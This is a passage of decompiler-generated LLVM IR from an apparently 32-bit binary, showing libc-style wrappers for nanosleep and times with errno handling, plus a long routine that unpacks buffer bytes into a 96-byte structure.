dec_label_pc_153b4:                               ; preds = %dec_label_pc_153a0
  %v0_153b4 = call i32 @function_13c70()
  %v0_153b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_153b8 = sub i32 0, %v0_153b8
  %v2_153bc = inttoptr i32 %v0_153b4 to i32*
  store i32 %v1_153b8, i32* %v2_153bc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_153c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153c4

dec_label_pc_153c4:                               ; preds = %dec_label_pc_153a0, %dec_label_pc_153b4
  %v2_153c8 = phi i32 [ %v3_153a0, %dec_label_pc_153a0 ], [ %v2_153c8.pre, %dec_label_pc_153b4 ]
  %v0_153c4 = phi i32 [ %arg1, %dec_label_pc_153a0 ], [ -1, %dec_label_pc_153b4 ]
  store i32 %v2_153c8, i32* %r4.global-to-local, align 4
  ret i32 %v0_153c4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153c4, { 1, 0 }
}

define i32 @function_153cc() local_unnamed_addr {
dec_label_pc_153cc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_153cc = load i32, i32* @r4, align 4
  store i32 %v3_153cc, i32* %stack_var_-8, align 4
  %v0_153d4 = load i32, i32* @r0, align 4
  store i32 %v0_153d4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_153d4, -4095
  br i1 %tmp, label %dec_label_pc_153f0, label %dec_label_pc_153e0

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153cc
  %v0_153e0 = call i32 @function_13c70()
  %v0_153e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_153e4 = sub i32 0, %v0_153e4
  %v2_153e8 = inttoptr i32 %v0_153e0 to i32*
  store i32 %v1_153e4, i32* %v2_153e8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_153f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153cc, %dec_label_pc_153e0
  %v2_153f4 = phi i32 [ %v3_153cc, %dec_label_pc_153cc ], [ %v2_153f4.pre, %dec_label_pc_153e0 ]
  %v0_153f0 = phi i32 [ %v0_153d4, %dec_label_pc_153cc ], [ -1, %dec_label_pc_153e0 ]
  store i32 %v2_153f4, i32* %r4.global-to-local, align 4
  ret i32 %v0_153f0

; uselistorder directives
  uselistorder i32 %v0_153d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153f0, { 1, 0 }
}

define i32 @function_153f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_153f8:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1543c, label %dec_label_pc_15428

dec_label_pc_15428:                               ; preds = %dec_label_pc_153f8
  %v0_15428 = call i32 @function_13c70()
  %v0_1542c = load i32, i32* %r4.global-to-local, align 4
  %v1_1542c = sub i32 0, %v0_1542c
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15434 = inttoptr i32 %v0_15428 to i32*
  store i32 %v1_1542c, i32* %v2_15434, align 4
  %v0_15444.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15444

dec_label_pc_1543c:                               ; preds = %dec_label_pc_153f8
  %v2_1543c = icmp eq i32 %arg1, 0
  br i1 %v2_1543c, label %dec_label_pc_15450, label %dec_label_pc_15444

dec_label_pc_15444:                               ; preds = %dec_label_pc_1543c, %dec_label_pc_15428
  %v0_15444 = phi i32 [ %arg1, %dec_label_pc_1543c ], [ %v0_15444.pre, %dec_label_pc_15428 ]
  br label %dec_label_pc_15454

dec_label_pc_15450:                               ; preds = %dec_label_pc_1543c
  br label %dec_label_pc_15454

dec_label_pc_15454:                               ; preds = %dec_label_pc_15444, %dec_label_pc_15450
  %v14_15458 = phi i32 [ %v0_15444, %dec_label_pc_15444 ], [ %tmp9, %dec_label_pc_15450 ]
  ret i32 %v14_15458

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15454, { 1, 0 }
}

define i32 @function_1545c(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1545c:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_1545c = load i32, i32* @r4, align 4
  store i32 %v3_1545c, i32* %stack_var_-8, align 4
  %v6_15460 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_15460, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_15460, -4095
  br i1 %tmp6, label %dec_label_pc_15480, label %dec_label_pc_15470

dec_label_pc_15470:                               ; preds = %dec_label_pc_1545c
  %v0_15470 = call i32 @function_13c70()
  %v0_15474 = load i32, i32* %r4.global-to-local, align 4
  %v1_15474 = sub i32 0, %v0_15474
  %v2_15478 = inttoptr i32 %v0_15470 to i32*
  store i32 %v1_15474, i32* %v2_15478, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15480

dec_label_pc_15480:                               ; preds = %dec_label_pc_1545c, %dec_label_pc_15470
  %v0_15480 = phi i32 [ %v6_15460, %dec_label_pc_1545c ], [ -1, %dec_label_pc_15470 ]
  %v2_15484 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15484, i32* %r4.global-to-local, align 4
  ret i32 %v0_15480

; uselistorder directives
  uselistorder i32 %v6_15460, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15480, { 1, 0 }
}

define i32 @function_15488(i32 %arg1) local_unnamed_addr {
dec_label_pc_15488:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15488 = load i32, i32* @r4, align 4
  store i32 %v3_15488, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1ecb4.696 to i32), i32* %r4.global-to-local, align 4
  %v2_15490 = load i32, i32* @global_var_1ecb4.696, align 4
  %v2_15494 = icmp eq i32 %v2_15490, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_15494, label %dec_label_pc_154a4, label %dec_label_pc_154b0

dec_label_pc_154a4:                               ; preds = %dec_label_pc_15488
  %v2_154a4 = call i32 @function_15e90(i32* null)
  %v1_154a8 = icmp slt i32 %v2_154a4, 0
  br i1 %v1_154a8, label %dec_label_pc_154d0, label %dec_label_pc_154b0thread-pre-split

dec_label_pc_154b0thread-pre-split:               ; preds = %dec_label_pc_154a4
  %v0_154b4.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_154b0.pre = load i32, i32* @global_var_1ecb4.696, align 4
  br label %dec_label_pc_154b0

dec_label_pc_154b0:                               ; preds = %dec_label_pc_154b0thread-pre-split, %dec_label_pc_15488
  %v2_154b0 = phi i32 [ %v2_154b0.pre, %dec_label_pc_154b0thread-pre-split ], [ %v2_15490, %dec_label_pc_15488 ]
  %v1_154bc = phi i32 [ %v0_154b4.pr, %dec_label_pc_154b0thread-pre-split ], [ %arg1, %dec_label_pc_15488 ]
  %v2_154b4 = icmp eq i32 %v1_154bc, 0
  store i32 %v2_154b0, i32* %r4.global-to-local, align 4
  br i1 %v2_154b4, label %dec_label_pc_154d4, label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_154b0
  %v2_154bc = add i32 %v1_154bc, %v2_154b0
  %v1_154c4 = inttoptr i32 %v2_154bc to i32*
  %v2_154c4 = call i32 @function_15e90(i32* %v1_154c4)
  %v1_154c8 = icmp slt i32 %v2_154c4, 0
  br i1 %v1_154c8, label %dec_label_pc_154d0, label %dec_label_pc_154c4.dec_label_pc_154d4_crit_edge

dec_label_pc_154c4.dec_label_pc_154d4_crit_edge:  ; preds = %dec_label_pc_154c4
  %v0_154d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_154d4

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154c4, %dec_label_pc_154a4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154c4.dec_label_pc_154d4_crit_edge, %dec_label_pc_154b0, %dec_label_pc_154d0
  %v0_154d4 = phi i32 [ %v0_154d4.pre, %dec_label_pc_154c4.dec_label_pc_154d4_crit_edge ], [ %v2_154b0, %dec_label_pc_154b0 ], [ -1, %dec_label_pc_154d0 ]
  %v2_154d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_154d8, i32* @r4, align 4
  ret i32 %v0_154d4

; uselistorder directives
  uselistorder i32 %v2_154b0, { 1, 0, 2 }
  uselistorder i32* null, { 0, 3, 7, 39, 40, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 2, 22, 26, 25, 24, 23, 38, 6, 27, 28, 29, 36, 30, 31, 32, 33, 34, 35, 5, 37 }
  uselistorder label %dec_label_pc_154d4, { 2, 0, 1 }
}

define i32 @function_154e0(%tms* %arg1) local_unnamed_addr {
dec_label_pc_154e0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154e0 = load i32, i32* @r4, align 4
  store i32 %v3_154e0, i32* %stack_var_-8, align 4
  %v3_154e4 = call i32 @times(%tms* %arg1)
  store i32 %v3_154e4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_154e4, -4095
  br i1 %tmp, label %dec_label_pc_15504, label %dec_label_pc_154f4

dec_label_pc_154f4:                               ; preds = %dec_label_pc_154e0
  %v0_154f4 = call i32 @function_13c70()
  %v0_154f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_154f8 = sub i32 0, %v0_154f8
  %v2_154fc = inttoptr i32 %v0_154f4 to i32*
  store i32 %v1_154f8, i32* %v2_154fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %dec_label_pc_154e0, %dec_label_pc_154f4
  %v0_15504 = phi i32 [ %v3_154e4, %dec_label_pc_154e0 ], [ -1, %dec_label_pc_154f4 ]
  %v2_15508 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15508, i32* %r4.global-to-local, align 4
  ret i32 %v0_15504

; uselistorder directives
  uselistorder i32 %v3_154e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15504, { 1, 0 }
}

define i32 @function_1550c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1550c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 96, i32* @r2, align 4
  %v2_15528 = inttoptr i32 %arg2 to i8*
  %v3_15528 = call i32 @function_13cd0(i8* %v2_15528, i32 0)
  %v1_1552c = add i32 %tmp, 1
  %v2_1552c = inttoptr i32 %v1_1552c to i8*
  %v3_1552c = load i8, i8* %v2_1552c, align 1
  %v4_1552c = zext i8 %v3_1552c to i32
  %v1_15530 = add i32 %tmp, 5
  %v2_15530 = inttoptr i32 %v1_15530 to i8*
  %v3_15530 = load i8, i8* %v2_15530, align 1
  %v4_15530 = zext i8 %v3_15530 to i32
  %v2_15534 = load i8, i8* %arg1, align 1
  %v3_15534 = zext i8 %v2_15534 to i32
  %v1_15538 = add i32 %tmp, 4
  %v2_15538 = inttoptr i32 %v1_15538 to i8*
  %v3_15538 = load i8, i8* %v2_15538, align 1
  %v4_15538 = zext i8 %v3_15538 to i32
  %v1_1553c = add i32 %tmp, 2
  %v2_1553c = inttoptr i32 %v1_1553c to i8*
  %v3_1553c = load i8, i8* %v2_1553c, align 1
  %v4_1553c = zext i8 %v3_1553c to i32
  %v1_15540 = add i32 %tmp, 6
  %v2_15540 = inttoptr i32 %v1_15540 to i8*
  %v3_15540 = load i8, i8* %v2_15540, align 1
  %v4_15540 = zext i8 %v3_15540 to i32
  %v1_15544 = add i32 %tmp, 3
  %v2_15544 = inttoptr i32 %v1_15544 to i8*
  %v3_15544 = load i8, i8* %v2_15544, align 1
  %v4_15544 = zext i8 %v3_15544 to i32
  %v4_15548 = mul nuw nsw i32 %v4_1552c, 256
  %v5_15548 = or i32 %v3_15534, %v4_15548
  %v4_1554c = mul nuw nsw i32 %v4_15530, 256
  %v5_1554c = or i32 %v4_15538, %v4_1554c
  %v1_15550 = add i32 %tmp, 7
  %v2_15550 = inttoptr i32 %v1_15550 to i8*
  %v3_15550 = load i8, i8* %v2_15550, align 1
  %v4_15550 = zext i8 %v3_15550 to i32
  %v4_15554 = mul nuw nsw i32 %v4_1553c, 65536
  %v5_15554 = or i32 %v4_15554, %v5_15548
  %v4_15558 = mul nuw nsw i32 %v4_15540, 65536
  %v5_15558 = or i32 %v4_15558, %v5_1554c
  %v4_1555c = mul nuw i32 %v4_15544, 16777216
  %v5_1555c = or i32 %v4_1555c, %v5_15554
  %v4_15560 = mul nuw i32 %v4_15550, 16777216
  %v5_15560 = or i32 %v4_15560, %v5_15558
  store i32 %v5_15560, i32* %r3.global-to-local, align 4
  %v0_15564 = load i32, i32* %r7.global-to-local, align 4
  %v1_15564 = inttoptr i32 %v0_15564 to i32*
  store i32 %v5_1555c, i32* %v1_15564, align 4
  %v3_15564 = add i32 %v0_15564, 4
  %v4_15564 = inttoptr i32 %v3_15564 to i32*
  %v5_15564 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15564, i32* %v4_15564, align 4
  %v0_15568 = load i32, i32* %r4.global-to-local, align 4
  %v1_15568 = add i32 %v0_15568, 89
  %v2_15568 = inttoptr i32 %v1_15568 to i8*
  %v3_15568 = load i8, i8* %v2_15568, align 1
  %v4_15568 = zext i8 %v3_15568 to i32
  %v1_1556c = add i32 %v0_15568, 93
  %v2_1556c = inttoptr i32 %v1_1556c to i8*
  %v3_1556c = load i8, i8* %v2_1556c, align 1
  %v4_1556c = zext i8 %v3_1556c to i32
  %v1_15570 = add i32 %v0_15568, 88
  %v2_15570 = inttoptr i32 %v1_15570 to i8*
  %v3_15570 = load i8, i8* %v2_15570, align 1
  %v4_15570 = zext i8 %v3_15570 to i32
  %v1_15574 = add i32 %v0_15568, 92
  %v2_15574 = inttoptr i32 %v1_15574 to i8*
  %v3_15574 = load i8, i8* %v2_15574, align 1
  %v4_15574 = zext i8 %v3_15574 to i32
  store i32 %v4_15574, i32* %r3.global-to-local, align 4
  %v1_15578 = add i32 %v0_15568, 94
  %v2_15578 = inttoptr i32 %v1_15578 to i8*
  %v3_15578 = load i8, i8* %v2_15578, align 1
  %v4_15578 = zext i8 %v3_15578 to i32
  %v1_1557c = add i32 %v0_15568, 90
  %v2_1557c = inttoptr i32 %v1_1557c to i8*
  %v3_1557c = load i8, i8* %v2_1557c, align 1
  %v4_1557c = zext i8 %v3_1557c to i32
  %v1_15580 = add i32 %v0_15568, 91
  %v2_15580 = inttoptr i32 %v1_15580 to i8*
  %v3_15580 = load i8, i8* %v2_15580, align 1
  %v4_15580 = zext i8 %v3_15580 to i32
  %v4_15584 = mul nuw nsw i32 %v4_15568, 256
  %v5_15584 = or i32 %v4_15570, %v4_15584
  %v4_15588 = mul nuw nsw i32 %v4_1556c, 256
  %v5_15588 = or i32 %v4_15574, %v4_15588
  store i32 %v5_15588, i32* %r3.global-to-local, align 4
  %v1_1558c = add i32 %v0_15568, 95
  %v2_1558c = inttoptr i32 %v1_1558c to i8*
  %v3_1558c = load i8, i8* %v2_1558c, align 1
  %v4_1558c = zext i8 %v3_1558c to i32
  %v4_15590 = mul nuw nsw i32 %v4_15578, 65536
  %v5_15590 = or i32 %v4_15590, %v5_15588
  store i32 %v5_15590, i32* %r3.global-to-local, align 4
  %v4_15594 = mul nuw nsw i32 %v4_1557c, 65536
  %v5_15594 = or i32 %v4_15594, %v5_15584
  %v4_15598 = mul nuw i32 %v4_15580, 16777216
  %v5_15598 = or i32 %v4_15598, %v5_15594
  %v4_1559c = mul nuw i32 %v4_1558c, 16777216
  %v5_1559c = or i32 %v4_1559c, %v5_15590
  store i32 %v5_1559c, i32* %r6.global-to-local, align 4
  %v1_155a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_155a0 = add i32 %v1_155a0, 88
  %v3_155a0 = inttoptr i32 %v2_155a0 to i32*
  store i32 %v5_15598, i32* %v3_155a0, align 4
  %v0_155a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_155a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_155a4 = add i32 %v1_155a4, 92
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  store i32 %v0_155a4, i32* %v3_155a4, align 4
  %v0_155a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155a8 = add i32 %v0_155a8, 13
  %v2_155a8 = inttoptr i32 %v1_155a8 to i8*
  %v3_155a8 = load i8, i8* %v2_155a8, align 1
  %v4_155a8 = zext i8 %v3_155a8 to i32
  %v1_155ac = add i32 %v0_155a8, 12
  %v2_155ac = inttoptr i32 %v1_155ac to i8*
  %v3_155ac = load i8, i8* %v2_155ac, align 1
  %v4_155ac = zext i8 %v3_155ac to i32
  store i32 %v4_155ac, i32* %r3.global-to-local, align 4
  %v1_155b0 = add i32 %v0_155a8, 14
  %v2_155b0 = inttoptr i32 %v1_155b0 to i8*
  %v3_155b0 = load i8, i8* %v2_155b0, align 1
  %v4_155b0 = zext i8 %v3_155b0 to i32
  %v4_155b4 = mul nuw nsw i32 %v4_155a8, 256
  %v5_155b4 = or i32 %v4_155ac, %v4_155b4
  store i32 %v5_155b4, i32* %r3.global-to-local, align 4
  %v1_155b8 = add i32 %v0_155a8, 15
  %v2_155b8 = inttoptr i32 %v1_155b8 to i8*
  %v3_155b8 = load i8, i8* %v2_155b8, align 1
  %v4_155b8 = zext i8 %v3_155b8 to i32
  %v4_155bc = mul nuw nsw i32 %v4_155b0, 65536
  %v5_155bc = or i32 %v4_155bc, %v5_155b4
  %v4_155c0 = mul nuw i32 %v4_155b8, 16777216
  %v5_155c0 = or i32 %v5_155bc, %v4_155c0
  store i32 %v5_155c0, i32* %r3.global-to-local, align 4
  %v1_155c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_155c4 = add i32 %v1_155c4, 12
  %v3_155c4 = inttoptr i32 %v2_155c4 to i32*
  store i32 %v5_155c0, i32* %v3_155c4, align 4
  %v0_155c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155c8 = add i32 %v0_155c8, 17
  %v2_155c8 = inttoptr i32 %v1_155c8 to i8*
  %v3_155c8 = load i8, i8* %v2_155c8, align 1
  %v4_155c8 = zext i8 %v3_155c8 to i32
  %v1_155cc = add i32 %v0_155c8, 16
  %v2_155cc = inttoptr i32 %v1_155cc to i8*
  %v3_155cc = load i8, i8* %v2_155cc, align 1
  %v4_155cc = zext i8 %v3_155cc to i32
  store i32 %v4_155cc, i32* %r3.global-to-local, align 4
  %v1_155d0 = add i32 %v0_155c8, 18
  %v2_155d0 = inttoptr i32 %v1_155d0 to i8*
  %v3_155d0 = load i8, i8* %v2_155d0, align 1
  %v4_155d0 = zext i8 %v3_155d0 to i32
  %v4_155d4 = mul nuw nsw i32 %v4_155c8, 256
  %v5_155d4 = or i32 %v4_155cc, %v4_155d4
  store i32 %v5_155d4, i32* %r3.global-to-local, align 4
  %v1_155d8 = add i32 %v0_155c8, 19
  %v2_155d8 = inttoptr i32 %v1_155d8 to i8*
  %v3_155d8 = load i8, i8* %v2_155d8, align 1
  %v4_155d8 = zext i8 %v3_155d8 to i32
  %v4_155dc = mul nuw nsw i32 %v4_155d0, 65536
  %v5_155dc = or i32 %v4_155dc, %v5_155d4
  %v4_155e0 = mul nuw i32 %v4_155d8, 16777216
  %v5_155e0 = or i32 %v5_155dc, %v4_155e0
  store i32 %v5_155e0, i32* %r3.global-to-local, align 4
  %v1_155e4 = load i32, i32* %r7.global-to-local, align 4
  %v2_155e4 = add i32 %v1_155e4, 16
  %v3_155e4 = inttoptr i32 %v2_155e4 to i32*
  store i32 %v5_155e0, i32* %v3_155e4, align 4
  %v0_155e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155e8 = add i32 %v0_155e8, 21
  %v2_155e8 = inttoptr i32 %v1_155e8 to i8*
  %v3_155e8 = load i8, i8* %v2_155e8, align 1
  %v4_155e8 = zext i8 %v3_155e8 to i32
  %v1_155ec = add i32 %v0_155e8, 20
  %v2_155ec = inttoptr i32 %v1_155ec to i8*
  %v3_155ec = load i8, i8* %v2_155ec, align 1
  %v4_155ec = zext i8 %v3_155ec to i32
  store i32 %v4_155ec, i32* %r3.global-to-local, align 4
  %v1_155f0 = add i32 %v0_155e8, 22
  %v2_155f0 = inttoptr i32 %v1_155f0 to i8*
  %v3_155f0 = load i8, i8* %v2_155f0, align 1
  %v4_155f0 = zext i8 %v3_155f0 to i32
  %v4_155f4 = mul nuw nsw i32 %v4_155e8, 256
  %v5_155f4 = or i32 %v4_155ec, %v4_155f4
  store i32 %v5_155f4, i32* %r3.global-to-local, align 4
  %v1_155f8 = add i32 %v0_155e8, 23
  %v2_155f8 = inttoptr i32 %v1_155f8 to i8*
  %v3_155f8 = load i8, i8* %v2_155f8, align 1
  %v4_155f8 = zext i8 %v3_155f8 to i32
  %v4_155fc = mul nuw nsw i32 %v4_155f0, 65536
  %v5_155fc = or i32 %v4_155fc, %v5_155f4
  %v4_15600 = mul nuw i32 %v4_155f8, 16777216
  %v5_15600 = or i32 %v5_155fc, %v4_15600
  store i32 %v5_15600, i32* %r3.global-to-local, align 4
  %v1_15604 = load i32, i32* %r7.global-to-local, align 4
  %v2_15604 = add i32 %v1_15604, 20
  %v3_15604 = inttoptr i32 %v2_15604 to i32*
  store i32 %v5_15600, i32* %v3_15604, align 4
  %v0_15608 = load i32, i32* %r4.global-to-local, align 4
  %v1_15608 = add i32 %v0_15608, 25
  %v2_15608 = inttoptr i32 %v1_15608 to i8*
  %v3_15608 = load i8, i8* %v2_15608, align 1
  %v4_15608 = zext i8 %v3_15608 to i32
  %v1_1560c = add i32 %v0_15608, 24
  %v2_1560c = inttoptr i32 %v1_1560c to i8*
  %v3_1560c = load i8, i8* %v2_1560c, align 1
  %v4_1560c = zext i8 %v3_1560c to i32
  store i32 %v4_1560c, i32* %r3.global-to-local, align 4
  %v1_15610 = add i32 %v0_15608, 26
  %v2_15610 = inttoptr i32 %v1_15610 to i8*
  %v3_15610 = load i8, i8* %v2_15610, align 1
  %v4_15610 = zext i8 %v3_15610 to i32
  %v4_15614 = mul nuw nsw i32 %v4_15608, 256
  %v5_15614 = or i32 %v4_1560c, %v4_15614
  store i32 %v5_15614, i32* %r3.global-to-local, align 4
  %v1_15618 = add i32 %v0_15608, 27
  %v2_15618 = inttoptr i32 %v1_15618 to i8*
  %v3_15618 = load i8, i8* %v2_15618, align 1
  %v4_15618 = zext i8 %v3_15618 to i32
  %v4_1561c = mul nuw nsw i32 %v4_15610, 65536
  %v5_1561c = or i32 %v4_1561c, %v5_15614
  %v4_15620 = mul nuw i32 %v4_15618, 16777216
  %v5_15620 = or i32 %v5_1561c, %v4_15620
  store i32 %v5_15620, i32* %r3.global-to-local, align 4
  %v1_15624 = load i32, i32* %r7.global-to-local, align 4
  %v2_15624 = add i32 %v1_15624, 24
  %v3_15624 = inttoptr i32 %v2_15624 to i32*
  store i32 %v5_15620, i32* %v3_15624, align 4
  %v0_15628 = load i32, i32* %r4.global-to-local, align 4
  %v1_15628 = add i32 %v0_15628, 29
  %v2_15628 = inttoptr i32 %v1_15628 to i8*
  %v3_15628 = load i8, i8* %v2_15628, align 1
  %v4_15628 = zext i8 %v3_15628 to i32
  %v1_1562c = add i32 %v0_15628, 28
  %v2_1562c = inttoptr i32 %v1_1562c to i8*
  %v3_1562c = load i8, i8* %v2_1562c, align 1
  %v4_1562c = zext i8 %v3_1562c to i32
  store i32 %v4_1562c, i32* %r3.global-to-local, align 4
  %v1_15630 = add i32 %v0_15628, 30
  %v2_15630 = inttoptr i32 %v1_15630 to i8*
  %v3_15630 = load i8, i8* %v2_15630, align 1
  %v4_15630 = zext i8 %v3_15630 to i32
  %v4_15634 = mul nuw nsw i32 %v4_15628, 256
  %v5_15634 = or i32 %v4_1562c, %v4_15634
  store i32 %v5_15634, i32* %r3.global-to-local, align 4
  %v1_15638 = add i32 %v0_15628, 31
  %v2_15638 = inttoptr i32 %v1_15638 to i8*
  %v3_15638 = load i8, i8* %v2_15638, align 1
  %v4_15638 = zext i8 %v3_15638 to i32
  %v4_1563c = mul nuw nsw i32 %v4_15630, 65536
  %v5_1563c = or i32 %v4_1563c, %v5_15634
  %v4_15640 = mul nuw i32 %v4_15638, 16777216
  %v5_15640 = or i32 %v5_1563c, %v4_15640
  store i32 %v5_15640, i32* %r3.global-to-local, align 4
  %v1_15644 = load i32, i32* %r7.global-to-local, align 4
  %v2_15644 = add i32 %v1_15644, 28
  %v3_15644 = inttoptr i32 %v2_15644 to i32*
  store i32 %v5_15640, i32* %v3_15644, align 4
  %v0_15648 = load i32, i32* %r4.global-to-local, align 4
  %v1_15648 = add i32 %v0_15648, 33
  %v2_15648 = inttoptr i32 %v1_15648 to i8*
  %v3_15648 = load i8, i8* %v2_15648, align 1
  %v4_15648 = zext i8 %v3_15648 to i32
  %v1_1564c = add i32 %v0_15648, 37
  %v2_1564c = inttoptr i32 %v1_1564c to i8*
  %v3_1564c = load i8, i8* %v2_1564c, align 1
  %v4_1564c = zext i8 %v3_1564c to i32
  %v1_15650 = add i32 %v0_15648, 32
  %v2_15650 = inttoptr i32 %v1_15650 to i8*
  %v3_15650 = load i8, i8* %v2_15650, align 1
  %v4_15650 = zext i8 %v3_15650 to i32
  %v1_15654 = add i32 %v0_15648, 36
  %v2_15654 = inttoptr i32 %v1_15654 to i8*
  %v3_15654 = load i8, i8* %v2_15654, align 1
  %v4_15654 = zext i8 %v3_15654 to i32
  store i32 %v4_15654, i32* %r3.global-to-local, align 4
  %v1_15658 = add i32 %v0_15648, 34
  %v2_15658 = inttoptr i32 %v1_15658 to i8*
  %v3_15658 = load i8, i8* %v2_15658, align 1
  %v4_15658 = zext i8 %v3_15658 to i32
  %v1_1565c = add i32 %v0_15648, 38
  %v2_1565c = inttoptr i32 %v1_1565c to i8*
  %v3_1565c = load i8, i8* %v2_1565c, align 1
  %v4_1565c = zext i8 %v3_1565c to i32
  %v1_15660 = add i32 %v0_15648, 35
  %v2_15660 = inttoptr i32 %v1_15660 to i8*
  %v3_15660 = load i8, i8* %v2_15660, align 1
  %v4_15660 = zext i8 %v3_15660 to i32
  %v4_15664 = mul nuw nsw i32 %v4_15648, 256
  %v5_15664 = or i32 %v4_15650, %v4_15664
  %v4_15668 = mul nuw nsw i32 %v4_1564c, 256
  %v5_15668 = or i32 %v4_15654, %v4_15668
  store i32 %v5_15668, i32* %r3.global-to-local, align 4
  %v1_1566c = add i32 %v0_15648, 39
  %v2_1566c = inttoptr i32 %v1_1566c to i8*
  %v3_1566c = load i8, i8* %v2_1566c, align 1
  %v4_1566c = zext i8 %v3_1566c to i32
  %v4_15670 = mul nuw nsw i32 %v4_15658, 65536
  %v5_15670 = or i32 %v4_15670, %v5_15664
  %v4_15674 = mul nuw nsw i32 %v4_1565c, 65536
  %v5_15674 = or i32 %v4_15674, %v5_15668
  %v4_15678 = mul nuw i32 %v4_15660, 16777216
  %v5_15678 = or i32 %v5_15670, %v4_15678
  %v4_1567c = mul nuw i32 %v4_1566c, 16777216
  %v5_1567c = or i32 %v5_15674, %v4_1567c
  store i32 %v5_1567c, i32* %r3.global-to-local, align 4
  %v1_15690 = load i32, i32* %r7.global-to-local, align 4
  %v2_15690 = add i32 %v1_15690, 32
  %v3_15690 = inttoptr i32 %v2_15690 to i32*
  store i32 %v5_15678, i32* %v3_15690, align 4
  %v0_15694 = load i32, i32* %r3.global-to-local, align 4
  %v1_15694 = load i32, i32* %r7.global-to-local, align 4
  %v2_15694 = add i32 %v1_15694, 36
  %v3_15694 = inttoptr i32 %v2_15694 to i32*
  store i32 %v0_15694, i32* %v3_15694, align 4
  %v0_15698 = load i32, i32* %r4.global-to-local, align 4
  %v1_15698 = add i32 %v0_15698, 45
  %v2_15698 = inttoptr i32 %v1_15698 to i8*
  %v3_15698 = load i8, i8* %v2_15698, align 1
  %v4_15698 = zext i8 %v3_15698 to i32
  %v1_1569c = add i32 %v0_15698, 49
  %v2_1569c = inttoptr i32 %v1_1569c to i8*
  %v3_1569c = load i8, i8* %v2_1569c, align 1
  %v4_1569c = zext i8 %v3_1569c to i32
  %v1_156a0 = add i32 %v0_15698, 44
  %v2_156a0 = inttoptr i32 %v1_156a0 to i8*
  %v3_156a0 = load i8, i8* %v2_156a0, align 1
  %v4_156a0 = zext i8 %v3_156a0 to i32
  %v1_156a4 = add i32 %v0_15698, 48
  %v2_156a4 = inttoptr i32 %v1_156a4 to i8*
  %v3_156a4 = load i8, i8* %v2_156a4, align 1
  %v4_156a4 = zext i8 %v3_156a4 to i32
  store i32 %v4_156a4, i32* %r3.global-to-local, align 4
  %v1_156a8 = add i32 %v0_15698, 46
  %v2_156a8 = inttoptr i32 %v1_156a8 to i8*
  %v3_156a8 = load i8, i8* %v2_156a8, align 1
  %v4_156a8 = zext i8 %v3_156a8 to i32
  %v1_156ac = add i32 %v0_15698, 50
